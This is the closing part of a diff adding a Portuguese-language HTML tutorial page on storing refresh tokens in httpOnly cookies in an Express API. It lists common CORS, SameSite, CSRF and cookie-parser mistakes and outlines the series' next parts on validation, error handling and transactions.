+    <li><strong>Esquecer <code>credentials: true</code> no CORS ou <code>credentials: 'include'</code> no <code>fetch</code></strong> — as duas pontas precisam concordar; faltando uma, o navegador simplesmente não manda o cookie, sem erro explícito.</li>
+    <li><strong>Combinar <code>credentials: true</code> com <code>origin: '*'</code></strong> — o navegador rejeita a resposta inteira. Precisa de lista explícita de origens (seção 12).</li>
+    <li><strong>Achar que <code>httpOnly</code> resolve XSS</strong> — não resolve. Impede o roubo do token; o script malicioso continua conseguindo agir enquanto a página está aberta. A defesa contra XSS é escapar saída, CSP (parte 9) e cuidado com dependências.</li>
+    <li><strong>Colocar o access token também em cookie</strong> — aí as rotas de negócio passam a se autenticar por cookie, o CSRF vira problema de verdade, e o token anti-CSRF deixa de ser opcional (seção 6).</li>
+    <li><strong>Confundir <em>same-site</em> com <em>same-origin</em></strong> — porta e subdomínio mudam a origem, não o site. Ver a tabela da seção 7 antes de suspeitar de <code>SameSite</code>.</li>
+    <li><strong>Testar com <code>curl</code> sem <code>-b</code>/<code>-c</code></strong> — sem cookie jar, cada chamada é um navegador novo e sem sessão. Todo refresh dá <code>401</code>, e não é bug.</li>
+    <li><strong>Esquecer <code>app.use(cookieParser())</code></strong> — <code>req.cookies</code> fica <code>undefined</code>, e a leitura <code>req.cookies[COOKIE_REFRESH]</code> lança <code>TypeError</code> → <code>500</code>.</li>
+  </ol>
+
+  <h2 id="proximos-passos">15. O que vem a seguir</h2>
+  <p>Com isso a categoria <strong>segurança e autorização</strong> fecha por completo: identidade (parte 7), sessão renovável e revogável (parte 8), borda (parte 9), papéis e posse (parte 10), e o token de vida longa fora do alcance de script (esta). O que sobra dela são itens que dependem de produção — <code>Secure</code> só vale com HTTPS, e o token anti-CSRF só entra se o desenho mudar.</p>
+  <p>A próxima categoria da ordem combinada é <strong>corretude e robustez</strong>, e ela ataca o buraco mais visível que restou na API:</p>
+  <div class="next-steps">
+    <ol>
+      <li><strong>Validação de entrada</strong> — a próxima parte. Hoje toda validação é <code>if (!nome || !email)</code>: mandar <code>data_nascimento: "banana"</code> ou <code>capacidade_maxima: -5</code> atravessa o <code>if</code> e morre no Postgres como <code>500</code>, quando deveria ser <code>400</code> com mensagem por campo. Schema com Zod ou Joi num middleware resolve pras rotas todas de uma vez.</li>
+      <li><strong>Erros de domínio</strong> — junto: uma classe de erro própria e um error handler que saiba traduzi-la, pra <code>409</code>/<code>422</code> pararem de depender de <code>return res.status(...)</code> espalhado por cada rota.</li>
+      <li><strong>Transações</strong> — as duas condições de corrida anotadas: a Regra 1 da parte 6 (capacidade máxima) e a rotação do refresh da parte 8. Mesmo problema, mesma solução, e agora com cookie no meio vale conferir o comportamento sob requisições simultâneas.</li>
+    </ol>
+  </div>
+  <p>Depois dela: <strong>banco e dados</strong> (migrations, limpeza de tokens expirados, soft-delete de instrutor) → <strong>qualidade</strong> (Jest + supertest, CI) → <strong>contrato da API</strong> (paginação, OpenAPI) → <strong>produção</strong> (logging, health check, Dockerfile, deploy com HTTPS — onde o <code>secure: true</code> desta parte finalmente entra em ação).</p>
+
+  <footer class="closing">
+    <p>Ao testar, o momento que vale a pena observar é o <code>cat cookies.txt</code>: ver o token com <code>Path=/auth</code> e a marca de <code>HttpOnly</code> deixa concreto o que mudou — a string continua existindo, só não está mais em lugar nenhum que um script alcance. Volta com dúvidas, principalmente se algum <code>401</code> aparecer no refresh (quase sempre é <code>secure</code>, cookie jar esquecido, ou <code>path</code> divergente).</p>
+  </footer>
+</main>
+
+</div>
+</body>
+</html>
